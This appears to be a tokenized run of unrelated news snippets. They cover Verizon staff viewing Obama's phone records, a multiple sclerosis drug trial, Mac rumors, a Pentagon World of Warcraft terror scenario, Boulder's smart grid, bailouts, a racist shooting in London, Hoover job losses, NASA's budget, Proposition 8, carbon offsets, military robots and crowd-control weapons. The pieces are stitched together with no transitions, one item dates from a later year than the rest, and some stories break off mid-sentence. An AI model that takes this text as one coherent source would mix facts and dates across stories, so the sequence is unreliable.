President - elect Barack Obama may not find it that hard to give up his BlackBerry after all .
Verizon Wireless has announced that some of its employees accessed his personal cell phone account records .
The wireless provider apologized to the president - elect and said it would discipline the employees involved .
Verizon apparently realized this week that Obama 's records had been breached .
The account is linked to a flip phone that does not have e-mail or advanced data capabilities , and it has been inactive for several months .
Verizon employees who did not have authorization to view the account will be punished , the company said .
Obama , undoubtedly the most tech - savvy presidential candidate this season , owns a handful of phones including the flip Verizon device , a BlackBerry and an Apple iPhone .
Even if Verizon employees had n't violated his privacy , he was probably already prepared to give up those devices while in office for security reasons .
Still , the incident serves as a reminder of how loosely guarded customer records are in most organizations .
' Imprudent Curiosity '
Earlier this year , for instance , it was discovered that State Department employees sneaked a peek into the passport records of presidential candidates Obama , Hillary Clinton and John McCain .
At first , the State Department reported that a handful of employees had given in to " imprudent curiosity . "
Subsequently , the department 's inspector general surveyed the records of 150 politicians , athletes and entertainers , and found that 127 had been accessed -- some multiple times .
The report found " found many control weaknesses , including a general lack of policies , procedures , guidance , and training relating to the prevention and detection of unauthorized access to passport and applicant information and the subsequent response and disciplinary processes when a potential unauthorized access is substantiated . "
If this is the best the State Department can do , it is probably safe to assume that if you are at all well known , either locally or nationally , your records are fair game to curious workers .
Safety Inside
Part of the problem is that most companies concentrate their security efforts on protecting their systems from outside attacks , Matt Shanahan , senior vice president at AdmitOne Security , told the E - Commerce Times .
" Unfortunately , consumers -- regardless of celebrity status -- do not have control over the privacy practices of a service , " he said .
" Most privacy policies and practices focus on how customer information will be used across organizational lines or with partners .
The controls and monitoring for these policies often do not defend against insiders where standards do not exist regarding background checks , authentication , monitoring and access control . "
It is easy enough for a person to get a coworker to share a password or token in the work environment .
The good news , Shanahan suggested , is that " high profile breaches such as President - elect Obama 's phone records may bring about legislation to better protect consumers . "
Telcos may protest , though , mainly because of the costs involved .
" Telco systems are very complex and contain many databases with information about customers , including text messages , voice mail and call records , " Slavik Markovich , founder and CTO of Sentrigo , told the E - Commerce Times .
" Application controls of authentication and authorization are meaningless here , as the insiders have direct access to the databases and have privileges to access all information .
The only way to protect the information is to use tools such as database activity monitoring and data encryption , " he explained .
Ideally , companies should flag as confidential the accounts of people with unlisted numbers or those who otherwise would need to keep their data confidential -- such as senior politicians , famous athletes or movie stars -- so that they are not accessible by regular staff , said Markovich .
" Additionally , since application - level security is not sufficient when it comes to IT staff , data must be protected at the source : the database in which it is stored .
It is often impossible to prevent privileged users from accessing such information , " he noted , " but all access by privileged users should be monitored in real time with preventative controls in place to intercept any attempts to access private or confidential data . "
Staff Accountability
Even with these safeguards in place , telcos and other service providers would have to implement organizational and institutional changes to fully safeguard information , said Dominique Levin , EVP of marketing and strategy at LogLogic .
" The reality is that many employees have legitimate access to confidential information to do their jobs , " she told the E - Commerce Times .
" An executive assistant has access to a CEO rolodex , calendar and e-mail .
Your IT guy may see just about all of this information .
A phone company worker can trace your calls , and a healthcare worker can look at medical records .
The answer to stop leaks may not be technology , but accountability . "
Coincidentally , Levin added , " accountability " is a big mandate for the Obama government .
User Behavior
User behavior also has to change if records are to remain secure , Derek Manky , project manager of cyber security and threat research for Fortinet , told the E - Commerce Times .
For example , it proved very easy to hack into Republican vice presidential candidate Sarah Palin 's e-mail account because she was using a public , server - side stored service that anybody could access , should they guess the right password .
" This is an absolute no - no , " said Manky .
" Communications for any sensitive information should be safeguarded .
This means using no third - party services -- especially one that is available to the public via Web mail .
" Additionally , e-mail should always be encrypted so that should it fall into the hands of a malicious source , they will not be able to decrypt its payload , " he advised .
" Policies should certainly be set up that outline this , so that such an incident is unlikely to occur . "
Scientists at Britain 's University of Cambridge have found that a drug originally developed to treat leukemia may prove useful in the treatment of multiple sclerosis ( MS ) .
Professor Alastair Compston and colleagues conducted the three - year - long study on 334 patients with relapsing - remitting MS .
Results showed that alemtuzumab cut the number of attacks experienced by participants by 74 % more than that achieved by interferon - beta - 1a therapy , the current treatment of choice .
Furthermore , many of the study participants who received alemtuzumab recovered some of their lost functions , and were therefore less disabled at the end of the three - year - long study than they were at the beginning .
On the other hand , participants who were treated with interferon beta - 1a were more disabled by the end of the study .
The researchers say that their findings suggest that alemtuzumab may promote brain repair , thus enabling the recovery of neurological functions lost in previous attacks of the disease .
However , alemtuzumab can cause serious side effects .
One in five participants treated with alemtuzumab developed an over - or under- active thyroid gland , and 3 % developed immune thrombocytopenic purpura , a condition that leaves patients vulnerable to bleeding .
However , the researchers note that while this complication is potentially very serious , it is easily treated if identified early .
In a news release issued by the University of Cambridge , Professor Compston said : " Alemtuzumab is the most promising experimental drug for the treatment of multiple sclerosis , and we are hopeful that the Phase 3 trials will confirm that it can both stabilize and allow some recovery of what had previously been assumed to be irreversible disabilities . ”

At the live Diggnation that was just held in London as part of the “ Future of Web Apps ” Expo , Kevin Rose enlightened us with yet another juicy rumor .
He claimed that the new and yet to be announced MacBooks will support Blu - Ray drives .
Rose was spot on in his iPod / iTunes predictions for the recent “ Let ’s Rock ! ”
Apple event , and we ’ll find out on Tuesday if Rose can go 2 for 2 .
Rose , however , did qualify his prediction by saying that his source for the Blue - Ray rumor was not nearly as good as his source for the iPod nano and iTunes updates .
Rumors of Blu - Ray coming to the Mac stretch back to 2006 , but especially picked up steam after HD - DVD was put to rest .
With the MacBook line in desperate need of a refresh , this could very well be an interesting point of interest at next Tuesday ’s media event .

The American military and intelligence communities are increasingly worried that would - be bin Ladens might gather in a virtual world , to plan a real - life attack .
But the spies have n't given many details , about how it might be done .
Now , a Pentagon researcher has laid out how such a terror plot might unfold .
The planning ground is World of Warcraft .
The main target of this possibly nuclear strike : the White House .
There 's been no public proof to date of terrorists hatching plots in virtual worlds .
But online spaces like * World of Warcraft are making * some spooks , generals and Congressmen extremely nervous .
They imagine terrorists rehearsing attacks in these worlds , just like the U.S. military trains with commercial shoot - em - up games .
They worry that the massively multiplayer games make it incredibly easy to gather plotters from around the world .
But , mostly , virtual worlds are nerve - wracking to spies because they 're so hard to monitor .
The accounts are pseudonymous .
The access is global .
The jargon is thick .
And most of the spy agencies ' employees are n't exactly level - 70 shamans .
In a presentation late last week at the Director of National Intelligence Open Source Conference in Washington , Dr. Dwight Toavs , a professor at the Pentagon - funded National Defense University , gave a bit of a primer on virtual worlds to an audience largely ignorant about what happens in these online spaces .
Then he launched into a scenario , to demonstrate how a meatspace plot might be hidden by in - game chatter .
In it , two * World of Warcraft * players discuss a raid on the " White Keep " inside the " Stonetalon Mountains . "
The major objective is to set off a " Dragon Fire spell " inside , and make off with " 110 Gold and 234 Silver " in treasure .
" No one will dance there for a hundred years after this spell is cast , " one player , " war_monger , " crows .
Except , in this case , the White Keep is at 1600 Pennsylvania Avenue .
" Dragon Fire " is an unconventional weapon .
And " 110 Gold and 234 Silver " tells the plotters how to align the game 's map with one of Washington , D.C .
The fictional plot was originally developed by Dan Arey , for the Director of National Intelligence 's Summer Hard Problems workshop , or SHARP .
And its details are a little fuzzy .
The terminology does n't match World of Warcraft lingo , all that precisely .
There is no " White Keep " in World of Warcraft ; " Dragon Fire " is a spell in EverQuest , the old - school role - playing game , not WoW .
But the banter is reminiscent enough of World of Warcraft talk , to give outsiders an idea of how such a conversation might go down – and how hard it would be to identify .
Steven Aftergood , the Federation of the American Scientists analyst who 's been following the intelligence community for years , wonders how realistic these sorts of scenarios are , really .
" This concern is out there .
But it has to be viewed in context .
It 's the job of intelligence agencies to anticipate threats and counter them .
With that orientation , they 're always going to give more weight to a particular scenario than an objective analysis would allow , " he tells Danger Room .
" Could terrorists use Second Life ?
Sure , they can use anything .
But is it a significant augmentation ?
That 's not obvious .
It 's a scenario that an intelligence officer is duty - bound to consider .
That 's all . "
Toavs , for one , believes that spies will have to spend more time in virtual worlds like WoW , if they want to have a hope of keeping tabs on what goes on inside 'em .
Which means , some day soon , we might find secret agents in World of Warcraft , along with the druids and orcs and night elves .

The people of Boulder , Colo. , have a reputation for appreciating their environment .
Biking and hiking trails , parks and open spaces make up a large portion of the picturesque western city .
But Boulder 's love of the environment is taking on an innovative , technological edge perhaps more at home in science fiction than in average living rooms as the city transforms itself into America 's first Smart Grid City .
Watch the story Saturday on the Discovery Channel 's Focus Earth .
Soon , 50,000 homes in Boulder will soon be decked out with the latest in environmentally - friendly , energy - saving technology -- including solar panels , electric cars and , for some , a specialized heating , cooling and lighting system -- all of which will be integrated into a monitoring system that reports the home 's carbon footprint to the homeowner .
" We like to think of Smart Grid as bringing the world of Thomas Edison together with the world of Bill Gates , " said Ray Gogel of Xcel Energy , a utility company involved in the system 's installation .
Xcel , along with several green high - tech companies , has invested $ 100 million to transform Boulder into a living laboratory .
" We 're doing something that the whole world is looking at right now , " Gogel said .
University of Colorado Chancellor G.P. " Bud " Peterson and his wife , Val , were the first to let Xcel transform their home .
Xcel energy put solar panels on the house , gave them a new smart meter and a plug - in hybrid electric vehicle that literally plugs in to their house .
The new system allows Val Peterson to easily control her energy consumption .
" I pretty much get on my computer , tell my house and my car what to do and then I walk away , " she said .
" My solar panels are talking to my house , are talking to my car , are talking to my house .
It 's a beautiful system . "
These high - tech gadgets make the Peterson 's home so efficient that they are not just using less power , sometimes they save so much power that their meter is essentially spinning backward .
The excess power is stored in the house , charging the batteries in their car and supplying them with about two days ' worth of backup power .
Since they started the program , they have been able to produce 590.7 fewer pounds of carbon , saving enough to microwave 154 pizzas .
Multiply that by 50,000 customers -- the number currently expected to install the system -- and it can make quite an impact .
Another resident of Smart Grid City made his home so efficient that his utility bill has nearly vanished .
" Our monthly bill was $ 3 , " the resident said .
Each home 's smart meter keeps track of where the energy powering the house is coming from .
Bud Peterson believes the system could change the way consumers buy energy .
" Today , when you go online to buy an airline ticket , you can select on schedule or price , " he said .
" And with this type of system , you will be able to select whether you would like to use renewable energy , sustainable energy or coal - fired . "
For the Petersons , all the decisions can be made over the Internet , from anywhere in the world .
" If we left to go away for the weekend and we realize we left the air - conditioning on or we'd left some other things on , we could go through the Internet , through the Web from any computer , from your iPod or iPhone , and change the settings in the house , control the thermostat setting or a lot of the electrical appliances , " said Bud Peterson .
It 's a system that tempts users , like Val Peterson , to look even further into the future .
" You 've got a GPS locator that knows your location , and so if you 're driving back home you can actually program the system so that when you got within 5 miles of where you lived or where you worked it would turn the air - conditioning on or off automatically based on your location , " she said .
Gogel believes the project will prove to the world these kinds of systems are the future of energy .
" I honestly believe that as new houses are built this will become the standard that gets incorporated into the house , " Gogel said .
" You want to have a zero-energy house .
It makes sense over time . "
Until then , Boulder 's happy to use it 's power to show America how to use less .
WASHINGTON -- German Chancellor Angela Merkel heads to Paris to present Sunday to her colleagues from the euro zone a financial sector bailout plan for Germany that 's expected to be more than half the size of what has been enacted in the U.S .
A person familiar with the situation told Dow Jones Newswires that the government is considering a total bailout plan of €300 billion to €400 billion ( $ 402 billion to $ 536 billion ) , which includes state guarantees and the option to get a direct stake in banks .
As part of this , ...
With billions depending on the world 's iconic search engine for virtually every tidbit of information under the sun , Google is looking to take it one step further with its new " truth - seeking algorithm " that will rank sites by what it considers to be truth .
The hate is world wide .
A man told today how he was shot three times in a London street for wearing a Barack Obama T - shirt .
Dube Egwuatu was buying a mobile telephone top - up card in an off - licence when the gunman confronted him and glared at the top , which carries an image of the Democrat US presidential candidate underneath the legend ' Believe ' .
The man then launched into a tirade of racist slurs , shouting ' I f*** ing hate n*****s' and urging 36 - year - old Mr Egwuatu to leave the shop with him .
<>
' I could n't believe it was happening - and just because I was wearing an Obama T - shirt .
He was trying to make me walk somewhere quieter , saying : ' I 've got something for you , ' and ' I 'm going to kill you . '
He added : ' Obama inspires me , his educational track record alone is quite unbelievable - that is why I was wearing the T - shirt .
' I did not think for one minute it could stir up such powerful feelings of hatred and I never said a word to him . '

Advertisement A total of 337 jobs are under threat at Hoover 's headquarters in south Wales as managers announced the " possibility " of an end to manufacturing at the site .
In a statement on Tuesday afternoon , the company said it was starting a consultation with its manufacturing employees at the Merthyr Tydfil site .
The factory employs 450 staff and makes washing machines and tumble dryers .
The company said it was no longer able to produce competitively - priced items at the site .
In a statement , it added : " Regretfully , to ensure that Hoover Candy becomes more competitive we must consider all of our options , including the possibility of the cessation of manufacture at Merthyr Tydfil . "
Other departments including finance , legal , IT , order processing , transport and logistics , warehouse and distribution departments , are not affected by the announcement at this stage .
HOOVER IN MERTHYR 1948 : Factory opens 1973 : By time of Queen 's visit almost 5,000 people worked at site 1985 : Hoover became manufacturer for Sinclair C5 - company merges with Chicago Pacific Corportation 1992 : Hoover launched a disastrous free - flights offer for customers buying a product over £ 100 - but it could not meet demand and faced a £ 48 m payout after court cases 1995 : Hoover sold to Italian firm Candy
The company has a long history as a major employer in the town , with the factory on the edge of Merthyr opening back in 1948 and once employing 5,000 staff .
Workers were called to a meeting earlier this afternoon .
It follows concerns from local assembly member Huw Lewis earlier this month that jobs could be under threat .
Mr Lewis called Tuesday 's news a " terrible blow " for the workforce and Merthyr Tydfil .
" It is crucial that we now see a proactive response from the Welsh assembly government that provides for a positive future for the workforce as a whole .
" The company 's statement clearly indicates that there is a future for Hoover in Merthyr Tydfil and we have to do everything we can to maximise the opportunities that remain . "

Deputy First Minister Ieuan Wyn Jones said : " We have always worked with the employers at this important site in order to try and safeguard jobs and continued investment .
" We are saddened and disappointed to hear that Hoover Candy is now considering bringing an end to manufacturing at the plant .
" I am making arrangements to meet with senior executives from Hoover and trade union leaders , and no effort will be spared in trying to help maintain employment at the Hoover operation . "
He added he did not want to " raise expectations , because this is a very difficult period " .
" What I want the people of Merthyr to understand is how determined we are to be on their side and work with them . "
Conservative economic spokesman David Melding AM said it was the " grimmest confirmation so far that Wales faces a nasty and deep recession " .
He added : " Hoover is a premier league manufacturer and the significance of this decision will be lost on no - one .
For generations .
Hoover has been at the heart of manufacturing in the valleys . "
Mike German , leader of the Welsh Liberal Democrats and local AM said : " It is very sad news that the manufacturing side of the company could pull out of Merthyr .
" This is an area that depends on manufacturing jobs like this , as is the rest of Wales .
" These are uncertain times for many people in the region just before the Christmas period and I urge the Assembly Government to do all it can to work with Hoover to minimise the threat of job cuts . "

" They both just reply ' meh ' and keep watching TV , " said Cormac McKeown , head of content at Collins Dictionaries .
The origins of " meh " are murky , but the term grew in popularity after being used in a 2001 episode of The Simpsons in which Homer suggests a day trip to his children Bart and Lisa .
The dictionary defines " meh " as an expression of indifference or boredom , or an adjective meaning mediocre or boring .
Examples given by the dictionary include " the Canadian election was so meh " .
The dictionary 's compilers said the word originated in North America , spread through the internet and was now entering British spoken English .
" This is a new interjection from the US that seems to have inveigled its way into common speech over here , " McKeown said .
" Internet forums and email are playing a big part in formalising the spellings of vocal interjections like these .
A couple of other examples would be ' hmm ' and ' heh ' . "
President Barack Obama unveiled his 2013 budget proposal today ( Feb. 13 ) that , if approved as is by Congress , would decrease NASA 's overall budget by $ 59 million , but slash deep into some space science and planetary exploration missions .
The proposed 2013 budget for NASA does include some increases for space technology development and human space exploration .
According to White House officials and Office of Management of Budget , the proposed NASA budget for 2013 would do the following :
Provides $ 17.7 billion , a decrease of 0.3 percent , or $ 59 million , below the 2012 enacted level .
While making difficult choices , the Budget builds on our existing space infrastructure , continues efforts to streamline agency operations , and preserves innovative capabilities and technologies to sustain American leadership in space .
Implements a lower cost program of robotic exploration of Mars that will advance science and will also help lay the foundation for future human exploration .
Invests in new space technologies , such as laser communications and zero- gravity propellant transfer , which can improve America ’s ability to access and operate in space and enhance the competitiveness of the U.S. space industry .
Leverages a Federal investment of $ 830 million and private sector investment and ingenuity to develop a U.S. capability to transport crews into space , thereby eliminating our dependence on foreign capabilities in this area .
Provides continued robust funding for the development of a new heavy - lift rocket and crew capsule that will take America deeper into space than ever before , create American jobs , ensure continued U.S. leadership in space exploration , and inspire people around the world .
Provides $ 1.8 billion for research and a robust fleet of Earth observation spacecraft to strengthen U.S. leadership in the field , better understand climate change , improve future disaster predictions , and provide vital environmental data to Federal , State , and local policymakers .
Funds the highest priority astronomical observatories and robotic solar system explorers , including a successor to the Hubble telescope and a mission to return samples from an asteroid , while delaying unaffordable new missions .
Continues the effort to turn NASA ’s former space shuttle launch facilities at the Kennedy Space Center in Florida into a 21st Century launch complex so that they can efficiently support programs like the Space Launch System and commercial operators .
Streamlines agency operations , resulting in over $ 200 million in savings .

Voters in California have passed Proposition 8 by a narrow margin .
The proposition defines marriage as between a man and a woman and bans GLBT marriages , and invalidates existing marriages .
At 1:45 am PST with 78 % of precincts reporting , the yes vote had 52 % of the vote , with a margin of over 300,000 votes .
The vote has trended lower for yes throughout the evening as larger centers have been added to the tally , but the trend would appear not strong enough to change the result .
Opposition to Proposition 8 was strong in the tech community , with many leading companies financially backing the no campaign .

The $ 700 billion bailout bill that failed in the House after a dramatic Monday afternoon vote addressed many things , but not the regulatory vacuum that allowed Wall Street to get us into this mess .
Wrapped in a bipartisan bow , this plan — dubbed a “ rescue ” package on the Hill and a “ bailout ” elsewhere — will neither save the economy nor permanently shore up Wall Street .
Across the media , the proposal has been described as the largest government intervention since the Great Depression , but it by no means delivers the financial stability to the banking system or the economic security to the general population that the post - Great Depression Glass - Steagall Act of 1933 did .
The plan would not change regulation , despite some vague language : “ The Secretary shall review the current state of the financial markets and the regulatory system and submit a written report to the appropriate committees of Congress not later than April 30 , 2009 . ”
So Treasury Secretary Henry Paulson , or his successor , gets to ponder what should be done with the system — but can conclude that reforming it would make things worse .
Meanwhile , the cash infusion may provide a temporary respite for Wall Street — who would n’t want to clean house , to make room for more junk ? — before the meltdown proceeds .
And then what ?
A new administration would own the continuing failure .
In the meantime , executive compensation would be publicly clipped in time for the election , though the fine print reveals the bailout bill is merely creating “ special rules for tax treatment of executive compensation , ” not reducing bonus sizes .
And an oversight committee established by the package — the Financial Stability Oversight Board — would be staffed by the same people who did n’t see the meltdown coming , but who will be responsible for managing Toxic Hedge Fund USA .
Industry practices will remain as they are — non- transparent , risky , and under - regulated .
Perhaps , the greatest lie resides at the very top of the proposed plan : that the bailout will somehow “ [ assist ]
American families in preserving home ownership , stabilizing financial markets , and protecting taxpayers . ”
The only way to protect citizens is to re-regulate the industry along the lines of Glass - Steagall : divide its players and their books into understandable , less risky , more transparent entities .
Unfortunately , the Fed - brokered sale of Washington Mutual to JPMorgan Chase was the latest move toward further consolidation in an increasingly opaque industry .
The Democrats inserted a lukewarm provision into the bailout legislation to have the government aid in renegotiating borrowers ’ mortgages to better terms , but they did n’t include any enforcement measure requiring lenders to comply .
Another big lie is that this plan would minimize “ long - term costs to the taxpayers and maximizing the benefits for taxpayers . ”
This spin suggests that we would be making a good investment here .
But the assets targeted by the TARP ( Troubled Asset Relief Program ) do n’t have indigestion ; they are terminal .
The brightest hedge fund minds could n’t spin them into gold .
They are not worth buying .
And making taxpayer equity participation in the banks dumping these assets part of the bailout plan is a bad idea .
I ’d much rather have cash in my pocket than equity in Bank of America - Merrill Lynch right now .
Plus , we still do n’t know how to evaluate these assets .
The only real way would have been a show - and - tell .
Financial firms should have to disclose the details of their bad paper before the feds make out a check .
And this should have happened before the bailout legislation was even debated .
What would this entail ?
Each bank with assets targeted for disposal into the government dump should have to list them , including the collateral involved ( loans , other packages of loans , credit derivatives , swaps ) and pricing assumptions .
Such a rip - off - the - Band - Aid move would unclog credit on Wall Street and stabilize the economy more quickly .
Wall Street hates uncertainty , particularly regarding counter - party and competitors ’ credit - worthiness and hidden losses .
Uncertainty over which finance giant might disintegrate next — that ’s what ’s really keeping credit tight .
Without getting too technical , these mortgage - related securities are n’t necessarily backed by real loans , or real properties , or real anything .
They could be completely synthetic , comprised of credit derivatives and other complicated financial products that are not easy to quantify .
The bailout plan contains a vague description of how the cost of each troubled asset should be calculated .
This amounts to a computation based on changing interest rates , not liquidity or default values , which should have much more of an impact on price .
A cards - on - the - table approach is exactly what the industry would like to avoid because this exercise would prompt more questions about how Wall Street conducts business .
On this score , the current bailout plan would be a win for the players that will be left standing at the end of this meltdown .
For the rest of America , though , it would be a loss .
The current financial crisis — and the debate over the bailout package — provided an opportunity to shine a light under the hood of the industry , remove its engine , and reinstall a more efficient one .
It ’s not likely that the 130 or so House Republicans who bucked their party leaders to vote against the bill are looking for the re-regulation of Big Finance .
The 90 House Democrats who also voted against the bailout are probably more sympathetic to that approach .
But for the moment — despite all the harrumphing from pundits and commentators about the bailout ’s crash in the House — the opportunity to get it right ( or , at least , better ) remains .

Carbon offsets , or activities that reduce the amount of CO2 emitted each year , can take on a dizzying array of forms , from planting trees to flaring methane .
Blue Source , a company that offers technology to offset carbon in the U.S. ( by doing things like capturing carbon and storing it ) , has just gotten an investment from injured investment bank Goldman Sachs .
To get a simple idea of how carbon offsets work , think of them as a bit like stocks that are bought and sold by companies that emit large amounts of CO2 , like oil refiners .
Offsets are sold in Europe , but the market that is developing in the United States will be somewhat different , providing an opportunity for a new generation of startups .
Goldman , in particular , has been eager to get in on the action , having invested $ 14 million earlier this year in APX , a company that works on the technology used to actually trade offsets .
But Blue Source is closer to the action , in that it actually oversees the creation of offsets .
And Goldman is n’t the only one interested ; earlier this year , Och - Ziff Capital Management Group promised $ 500 million to a joint venture with Blue Source .
What that means is that several companies who are heavily involved in the major stock exchanges are betting that carbon offsets will become the next big trading opportunity , which is likely to happen once either Barack Obama or John McCain is elected to office .
For an entirely different set of yet - unseen startups , there ’s also an opportunity to find new , efficient ways to create offsets .
Blue Source , for example , reduces the methane released during coal mining , and captures escaping gas in landfills .
Some such techniques are well established , but others are yet to be developed , and require innovators to step in with new technologies .
For now , carbon trading is limited to a few regional markets in the United States , which have yet to grow very large .
Blue Source is located in Salt Lake City , Utah ; the company did n’t disclose the amount of Goldman Sachs ’ investment .
The government said it would keep spending to prevent a wider slowdown
The UK government borrowed a record amount last month , Office for National Statistics ( ONS ) data shows .
Public sector net borrowing hit £ 8.092bn in September , up from £ 4.775bn in the same period a year earlier , marking a record for the month .
The amount borrowed so far this financial year stands at £ 37.6 bn - the highest since records began in 1946 .
The government has said it will keep investing money into public works to prevent a recession .
Cutting spending or raising taxes to plug the gap in public finances would only clobber an already fragile economy
Hugh Pym , BBC economics editor
Analysis : UK public borrowing
The BBC 's economics editor Hugh Pym said that by any standards the latest reported levels of public sector borrowing were eye - watering .
" Even before a recession has developed - if indeed it does - the government has racked up a record amount of borrowing and it can only go higher as the economic downturn deepens , " he said .
Record borrowing Prime Minister Gordon Brown insisted Britain 's economy remained in a strong position to weather the downturn .
The public finances are in a complete state and in much worse shape than a year ago
Ernst & Young Item Club " The United Kingdom cannot insulate itself from this global downturn , " he said .
" But with interest rates low and falling , inflation expected to come down over the next year , these underlying economic indicators - particularly interest rates - make us stronger than at any other previous downturn , " he added .
Conservative leader David Cameron said the government had to take responsibility for the country 's economic woes .
" The government keeps saying - and the Prime Minister I think said it at least three times in his statement - this is a crisis from America , as if no - one in Britain has any responsibility for anything that went wrong , " said Mr Cameron .
Liberal Democrat leader Nick Clegg said the government should over tax cuts for people on low and middle incomes .
Slowdown
On a net cash requirement basis the government borrowed £ 12.65 bn last month , compared with a deficit of £ 8.72 bn in the same period a year ago .
This was also more than expected ; analysts had forecast that public borrowing would reach around £ 10.1 bn in September .
The cumulative borrowing for the period from April to September of £ 37.59bn is up from the £ 21.46bn borrowed in the same period a year earlier , and represents the largest total for a six month period since records began in 1946 .
The figures come a day after Ernst & Young Item 's Club said the UK economy was already in a recession and would see the economy shrink by 1 % next year , before growing by 1 % in 2010 .
In response to the latest figures the Item Club said : " The UK 's public finances are in a complete state and in much worse shape than a year ago " .
Figures later this week are expected to show that the UK economy shrank in the third quarter - the first contraction since 1992 .

Chancellor Alistair Darling had forecast in his Budget statement in March that public sector public borrowing for the full financial year - up to April 2009 - would reach £ 43 bn .
But the Item Club believes borrowing will reach £ 60bn in the financial year 2008 - 09 , with a current budget deficit of £ 27 billion , " much higher than the government 's own projection " .
In light of this , the club said it was clear " substantial revisions will be necessary in the Pre- Budget Report " .
Unemployment is already rising and forecast to continue doing so , which will will add further pressure on the government 's finances .
And recent data has underlined the weakness in the housing sector ; mortgage lending fell to its lowest level for more than three and a half years in September , according to the Council of Mortgage Lenders .
The UK and other governments recently took emergency steps to shore up the banking system in a bid to increase liquidity and stabilise the markets .

What are these ?
Trouser - moisteningly terrifying news broke this week , as it emerged that sinister forces within the US military are looking to develop a remorseless robotic wolfpack capable of hunting down " a non-cooperative human subject " in " an indoor environment " .
Yes , it 's true - last month , crazed Pentagon brainiacs asked contractors to develop a " Multi- Robot Pursuit System " , to consist of :
A software and sensor package to enable a team of robots to search for and detect human presence in an indoor environment ...
Operator control units are available that allow semi-autonomous map - based control of a team of robots ...
There has also been significant research in the game theory community involving pursuit / evasion scenarios .
This topic seeks to merge these research areas and develop a software / hardware suite that would enable a multi - robot team , together with a human operator , to search for and detect a non-cooperative human subject .
It will be necessary to determine an appropriate sensor suite that can reliably detect human presence and is suitable for implementation on small robotic platforms .
Typical robots for this type of activity are expected to weigh less than 100 Kg and the team would have three to five robots .
Not only will the skies of tomorrow be black with automated armadas of Reaper slay - planes , Fire Scout unmanned kill - choppers and possible crewless raygun cyber bombers ; not only will thousands of years of human civilisation rapidly be reduced to smoking rubble ; but even the option of cowering like a hunted beast in a cellar , sewer or tumbled monument has now been snatched away .
Those hoping to survive for years after the machine uprising , subsisting on refuse and scuttling rat - like through the ruins until loneliness and horror finally bring merciful insanity and death , have been balked .
Soulless squads of steel stormtrooper assassins will prowl the shattered cities of humanity like hunting velociraptor packs , sniffing out and snuffing the cowering remnant meatsacks , until a lifeless Pax Robotica rules the entire Earth unchallenged .
That 's surely the view being taken by two of Britain 's top technofear profs , asked to comment on the droid by renowned peacenik tech publication New Scientist .
Here 's Steve Wright of Leeds Metropolitan University :
" What we have here are the beginnings of something designed to enable robots to hunt down humans like a pack of dogs ... they will become autonomous and become armed .
" We can also expect ... sensors which detect human breath and the radio waves associated with a human heart beat .
These are technologies already developed . "
Wright has also predicted the coming of " a modern techno - politics " deploying " machine operatives " and " self - deciding automated sentinels " armed with a terrifying sci- fi panoply of microwave rayguns , pulse lasers , tranq bombs , plasma - lightning mob blasters , " vortex energy rings " and sonic beam weapons .
Honest : pdf , p12-13 .
Needless to say , Wright 's views are echoed by our old friend Noel Sharkey - the man who famously flagged up the threat of droid security troopers blasting little girls who try to share ice - creams with them , who has warned of the deadly robot terrorist threat , and who endorses bogus robot - buster weaponry companies .
" There will be a robot force under command of a single soldier with potentially dire consequences for innocents around the corner , " says Sharkey , speaking of the new droid doorkicker plans .
Hmm .
Except , you know , actually the consequences for innocents running into a well - equipped Western military are already much more deadly than this .
At the moment , due to a huge shortage of common - or - garden men with guns , such forces all too frequently deal with uncooperative humans in indoor environments by blowing up the entire building or even neighbourhood .
Even where a squad of troops can be found to clear a house , this is extremely dangerous work for the team doing the job .
As a result , they quite often shoot people they should n't , tending to value speed over correctness when making decisions .
Sure , robot house - clearers ( if armed ) could make mistakes and kill innocents .
But humans already do that anyway .
Easing the fear / kneejerk factor for the human soldier operator - the Multi-Robot Pursuit System software " should minimize the chance that the operator may encounter the subject " - might actually reduce the number of errors , not increase it .
And the fact that one soldier can clear a house could mean that more houses will cleared by soldiers , rather than by dropping thousand - pounders on them .
The huge majority of innocents killed in all recent wars have been the victims of heavy ordnance and / or landmines , typically airdropped - not any kind of weapon suitable for soldiers or " pursuit system " ground robots .
My god - could it be - sometimes technology makes things better than they were before ?
No , no .
Sorry .
Heresy .
Ahem .
Still , the opponents of the machine rebellion may not need to tool up with an electropulse rifle and barricade ourselves into the septic tank * just yet .
Today 's ground robots have absolutely zero chance of outmanoeuvring or outshooting human beings inside a building ; in a gunfight , the fleshies will emerge victorious .
That 's why this programme is not , as prof Sharkey says , part of the US army 's serious robot legion plan - the Future Combat Systems initiative .
Rather , it is being run by the Small Business Innovation Research effort , which is designed to make sure that SMEs get a snuffle at the mighty federal pork barrel now and then .
This is a job - creation effort for humans , not a serious tech push .
D'oh !
What am I saying ?
Normal service will now resume :
Holy crap !
The robots are coming !
They 're in the bunker !
Cutting through the door !
Take that , you metal swine !
Hah , they do n't care for the taste of high - power microwave pulse retribution .
Damn - electropulse gun empty - bacofoil cranial paralysis -ray shield out of juice !
Tin fucker 's got me by the leg !
Just leave me and save yourselves !
No , no - not the vortex energy ring !
Aiee !
And so forth . ®

Interesting :
Triggerfish , also known as cell - site simulators or digital analyzers , are nothing new : the technology was used in the 1990s to hunt down renowned hacker Kevin Mitnick .
By posing as a cell tower , triggerfish trick nearby cell phones into transmitting their serial numbers , phone numbers , and other data to law enforcement .
Most previous descriptions of the technology , however , suggested that because of range limitations , triggerfish were only useful for zeroing in on a phone 's precise location once cooperative cell providers had given a general location .
This summer , however , the American Civil Liberties Union and Electronic Frontier Foundation sued the Justice Department , seeking documents related to the FBI 's cell - phone tracking practices .
Since August , they 've received a stream of documents — the most recent batch on November 6 — that were posted on the Internet last week .
In a post on the progressive blog Daily Kos , ACLU spokesperson Rachel Myers drew attention to language in several of those documents implying that triggerfish have broader application than previously believed .
The riot police and military are both plunging into the future of crowd control , inventing space - age weapons that wo n't kill you , but will make you wish they had .
Such as ...
So with the whole meltdown of the financial system , you 're probably thinking about rioting soon .
But while you gather up your bottles and stones and get ready to face down The Man , there 's something you should know .
6 The PHASR ( aka Crowd - Blinding Rifle )
Continue Reading Below Advertisement
This futuristic weapon is being developed by the US military , who call it the Personal Halting and Stimulation Response rifle .
Why such a clumsy name ?
Because they wanted to call it a PHASR .
Get it !
Like in Star Trek !
How cute !
There 's no way this thing could turn out to be horrifying !
They also call these weapons " dazzlers , " proving for the second time in two paragraphs that many weapons designers have never known the touch of a woman .
It projects a laser and is intended to " dazzle " and temporarily blind the target .
It 's kind of like one of those annoying laser pointers crossed with the BFG from Doom .

Why It Wo n't Kill You :
According to the makers of the weapon , when used properly it does n't , under any circumstances , kill you or do any lasting damage .
